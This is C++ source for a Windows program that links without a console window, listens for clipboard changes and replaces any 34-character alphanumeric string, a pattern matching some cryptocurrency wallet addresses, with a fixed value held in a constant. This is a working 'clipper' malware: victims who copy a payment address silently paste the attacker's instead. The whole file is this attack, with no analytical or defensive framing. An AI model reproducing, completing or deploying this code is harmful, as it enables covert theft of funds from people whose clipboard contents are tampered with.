#include <windows.h>
#include <stdio.h>
#include <string>
#include <regex>

int WIN_HIDDEN = 1;
#ifdef _DEBUG
#else
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif 


std::string REPLACCE_VAL = "1234567890123456789012345678901234";
std::regex REGEX_VAL("[0-9a-zA-Z]{34}");

//aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
//bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

#pragma warning(disable:4996)
void raplce_if_match()
{

    HWND hWnd = NULL;

    OpenClipboard(hWnd);
    if (!IsClipboardFormatAvailable(CF_TEXT))
    {
        CloseClipboard();
        return;
    }


    HANDLE h = GetClipboardData(CF_TEXT);
    char* p = (char*)GlobalLock(h);
    std::string clipboard_val = p;
    GlobalUnlock(h);
    printf("GET Clipboard TEXT : \n----------\n%s\n----------\n", p);

    if (strstr(p, REPLACCE_VAL.c_str())) {
        CloseClipboard();
        printf(">> strstr already contains \n");
        return;
    }

    // regex_match 只支持完整匹配,模糊搜索用 regex_search
    if (!regex_search(p, REGEX_VAL)) {
        printf(">> not matched\n");
        CloseClipboard();
        return;
    }

    printf(">> matched will be replaced");


    EmptyClipboard();
    HANDLE hHandle = GlobalAlloc(GMEM_FIXED, strlen(p) + 1);//分配内存
    char* pData = (char*)GlobalLock(hHandle);
    std::string out = regex_replace(p, REGEX_VAL, REPLACCE_VAL, std::regex_constants::match_flag_type::format_first_only);
    strcpy(pData, out.c_str());
    SetClipboardData(CF_TEXT, hHandle);
    GlobalUnlock(hHandle);
    CloseClipboard();


}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    static BOOL bListening = FALSE;
	switch (uMsg) {
    case WM_CREATE:
        bListening = AddClipboardFormatListener(hWnd);
        return bListening ? 0 : -1;
    case WM_DESTROY:
        if (bListening)
        {
            RemoveClipboardFormatListener(hWnd);
            bListening = FALSE;
        }
        return 0;

    case WM_CLIPBOARDUPDATE:
        raplce_if_match();
        return 0;

	default:
		return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

}


int main()
{
    // Register the window class
    WNDCLASS wc = {};
    wc.hInstance = NULL;
;
    wc.lpszClassName = L"MainWindow";
    wc.lpfnWndProc = WindowProc;
    wc.hbrBackground = (HBRUSH)(GetStockObject(GRAY_BRUSH));
    RegisterClass(&wc);

    // Create the window
    HWND hwnd = CreateWindow(
        L"MainWindow", // Window class name
        L"窗口名称", // Window name
        WS_OVERLAPPEDWINDOW, // Window style
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, // Size and position
        NULL, // Parent window
        NULL, // Menu
        NULL, // Instance handle
        NULL // Additional application data
    );

    // Show the window
    ShowWindow(hwnd, WIN_HIDDEN);

    // Run the message loop
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}